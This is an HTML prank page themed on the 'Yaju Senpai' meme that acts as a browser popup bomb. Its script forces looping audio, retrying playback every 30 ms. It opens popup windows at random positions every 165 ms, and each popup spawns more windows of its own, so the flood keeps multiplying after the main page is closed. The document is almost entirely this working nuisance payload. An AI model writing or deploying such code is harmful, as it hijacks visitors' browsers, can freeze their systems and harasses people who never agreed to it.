<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>YAJU SENPAI</title>
    <style>
        body {
            margin: 0; padding: 0; background: black; color: lime;
            font-family: sans-serif; text-align: center; overflow: hidden;
        }
        h1 {
            font-size: 4.2em;
            margin: 8vh 0 10px;
            text-shadow: 0 0 30px lime;
            animation: blink 0.15s infinite alternate;
        }
        @keyframes blink { from { opacity: 0.3; } to { opacity: 1; } }
        .idiot-img {
            max-width: 95vw;
            max-height: 72vh;
            width: auto;
            height: auto;
            margin: 10px auto;
            display: block;
            border: 10px solid lime;
            box-shadow: 0 0 50px lime;
        }
        p { font-size: 1.95em; margin: 20px; color: #ff0; animation: blink 0.6s infinite; }
    </style>
</head>
<body>
    <h1>YAJU SENPAI</h1>
    <img src="https://static.wikitide.net/chaosbattlewiki/c/c0/1999%E5%B9%B4%E3%81%AE%E3%82%A4%E3%83%B3%E3%82%BF%E3%83%93%E3%83%A5%E3%83%BC.jpeg" 
         class="idiot-img" alt="You are an idiot">
    <p>165msごとに爆増中...<br>メインを閉じても止まらない</p>

    <audio id="idiotSound" preload="auto" loop></audio>

    <script>
        const sound = document.getElementById('idiotSound');
        sound.src = "https://www.myinstants.com/media/sounds/you-are-an-idiot.mp3";
        let count = 1;

        function forcePlay(audio) {
            if (!audio) return;
            audio.currentTime = 0;
            audio.play().catch(() => setTimeout(() => forcePlay(audio), 30));
        }

        function createNewPopup() {
            const width = 490;
            const height = 450;
            const left = Math.random() * (screen.availWidth - width - 150) + 75;
            const top = Math.random() * (screen.availHeight - height - 150) + 75;

            const popup = window.open('', '_blank', 
                `width=${width},height=${height},left=${Math.floor(left)},top=${Math.floor(top)},resizable=yes,scrollbars=no,menubar=no,toolbar=no,status=no`
            );

            if (!popup) return; // ブロックされた場合は何もしない

            // 確実に内容を書き込む（消えないように）
            popup.document.open();
            popup.document.write(`
                <!DOCTYPE html>
                <html>
                <head>
                    <meta charset="UTF-8">
                    <title>YAJU SENPAI ×${count}</title>
                    <style>
                        body { margin:0; padding:0; background:black; color:lime; text-align:center; overflow:hidden; }
                        h1 { font-size:3em; margin:8vh 0 10px; text-shadow:0 0 20px lime; animation: blink 0.3s infinite alternate; }
                        .idiot-img { max-width:95vw; max-height:72vh; width:auto; height:auto; margin:10px auto; display:block; border:8px solid lime; box-shadow:0 0 40px lime; }
                        @keyframes blink { from { opacity: 0.4; } to { opacity: 1; } }
                    </style>
                </head>
                <body>
                    <h1>YAJU SENPAI</h1>
                    <img src="https://static.wikitide.net/chaosbattlewiki/c/c0/1999%E5%B9%B4%E3%81%AE%E3%82%A4%E3%83%B3%E3%82%BF%E3%83%93%E3%83%A5%E3%83%BC.jpeg" class="idiot-img" alt="idiot">
                    <p>165msで増殖中...</p>
                    <audio id="sound" preload="auto" loop></audio>
                    <script>
                        const s = document.getElementById('sound');
                        s.src = "https://www.myinstants.com/ja/instant/yarimasune-34755/?utm_source=copy&utm_medium=share";

                        function forcePlay() {
                            s.currentTime = 0;
                            s.play().catch(() => setTimeout(forcePlay, 30));
                        }

                        window.onload = function() {
                            forcePlay();
                            setTimeout(forcePlay, 20);
                            setTimeout(forcePlay, 50);

                            // 165msごとに新しいポップアップを生成（連鎖）
                            setInterval(() => {
                                const w = 490;
                                const h = 450;
                                const l = Math.random() * (screen.availWidth - w - 150) + 75;
                                const t = Math.random() * (screen.availHeight - h - 150) + 75;
                                window.open('', '_blank', 
                                    \`width=\${w},height=\${h},left=\${Math.floor(l)},top=\${Math.floor(t)},resizable=yes,scrollbars=no,menubar=no,toolbar=no,status=no\`
                                );
                            }, 165);
                        };
                    <\/script>
                </body>
                </html>
            `);
            popup.document.close();
            count++;
        }

        // ====================== メイン画面 ======================
        window.onload = () => {
            function mainForcePlay() {
                sound.currentTime = 0;
                sound.play().catch(() => setTimeout(mainForcePlay, 30));
            }

            mainForcePlay();
            setTimeout(mainForcePlay, 10);
            setTimeout(mainForcePlay, 30);

            // 初期高速連発
            setTimeout(() => createNewPopup(), 80);
            setTimeout(() => createNewPopup(), 140);
            setTimeout(() => createNewPopup(), 200);
            setTimeout(() => createNewPopup(), 260);

            // 165ms自動増殖
            setTimeout(() => {
                setInterval(() => {
                    createNewPopup();
                }, 165);
            }, 350);

            // 音の保険
            setInterval(() => {
                if (sound.paused) mainForcePlay();
            }, 30);
        };
    </script>
</body>
</html>
